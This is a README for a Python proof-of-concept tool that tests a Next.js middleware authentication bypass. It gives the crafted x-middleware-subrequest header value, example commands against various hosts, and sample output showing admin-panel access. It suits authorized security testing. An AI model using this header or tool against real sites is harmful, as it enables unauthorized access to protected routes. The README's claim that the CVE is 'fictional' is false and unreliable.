# PoC for Next.js Middleware Bypass (CVE-2025-29927 - Fictional)
> **⚠️ Important Disclaimer**
>
> This tool is a Proof-of-Concept (PoC) for a **fictional vulnerability (CVE-2025-29927)**. It is intended for educational purposes, security research, and as a professional template for developing security tools. **The author is not responsible for any misuse or damage caused by this script. Use only in controlled and authorized environments.**

## About The Project

This script automates the process of sending a specially crafted HTTP request to a Next.js application to test if protected routes can be accessed by bypassing middleware security checks. It is built to be robust, easy to use, and highly informative.

### Features

  - ✨ **Colored & Verbose Output:** Clear, color-coded output for immediate identification of success or failure. A verbose mode (`-v`) provides detailed debugging information.
  - 📦 **Class-based & Clean Code:** Written using a clean, object-oriented structure for better readability and maintainability.
  - proxies: **Full Proxy Support:** Route your traffic through a proxy like Burp Suite or ZAP for inspection and debugging using the `--proxy` flag.
  - 🍪 **Session Management:** Uses a `requests.Session` object for efficient connection handling and automatic cookie management.
  - 🚦 **Intelligent Redirect Handling:** The script does not follow redirects by default, allowing it to correctly identify when a bypass fails and results in a redirection.
  - 🛠️ **Customizable:** Allows for custom User-Agents and custom header values to adapt to different testing scenarios.

## Getting Started

Follow these instructions to get a copy of the project up and running on your local machine for testing and research purposes.

### Prerequisites

  - Python 3.7 or higher
  - `pip` (Python package installer)

### Installation

1.  **Clone the repository:**
    ```sh
    git clone https://github.com/your-username/your-repository-name.git
    ```
2.  **Navigate to the project directory:**
    ```sh
    cd your-repository-name
    ```
3.  **Install the required packages:**
    The only dependency is the `requests` library.
    ```sh
    pip install requests
    ```

## Usage

The script is straightforward to run from the command line.

### Help Menu

To see all available options, use the `-h` or `--help` flag.

```sh
python poc.py -h
```

```
usage: poc.py [-h] [-p PATH] [-s {http,https}] [--header HEADER] [-ua USER_AGENT] [--proxy PROXY] [-v] host

A professional PoC template to test for Next.js middleware bypass.

positional arguments:
  host                  Target host and port (e.g., localhost:3000)

optional arguments:
  -h, --help            show this help message and exit
  -p PATH, --path PATH  Protected route path to access (default: /admin)
  -s {http,https}, --scheme {http,https}
                        Protocol to use (http or https) (default: http)
  --header HEADER       Value for the x-middleware-subrequest header (default: middleware:middleware)
  -ua USER_AGENT, --user-agent USER_AGENT
                        Custom User-Agent for the request (default: Mozilla/5.0)
  --proxy PROXY         Proxy to use for requests (e.g., http://127.0.0.1:8080)
  -v, --verbose         Enable verbose debug output
```

### Examples

1.  **Basic Test:**
    Run a simple test against a local server on port 3000, trying to access the default `/admin` path.

    ```sh
    python poc.py localhost:3000
    ```

2.  **Testing a Specific Path over HTTPS:**
    Test a production-like environment using `https` and targeting a `/dashboard` route.

    ```sh
    python poc.py www.example.com -s https -p /dashboard
    ```

3.  **Advanced Test with Proxy and Verbose Output:**
    This is useful for debugging. Route traffic through Burp Suite running on `http://127.0.0.1:8080` and print all debug information.

    ```sh
    python poc.py internal-app:8080 -v --proxy http://127.0.0.1:8080
    ```

### Example of a Successful Run

If the bypass is successful, the output will look like this:

```
[... Banner ...]

[*] Target URL: http://localhost:3000/admin
[+] SUCCESS: Middleware bypassed! Access granted.

--- Response Snippet ---
<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" 
content="width=device-width"/><title>Admin Panel</title>...
------------------------
```

## License

Distributed under the MIT License. See `LICENSE.md` for more information.
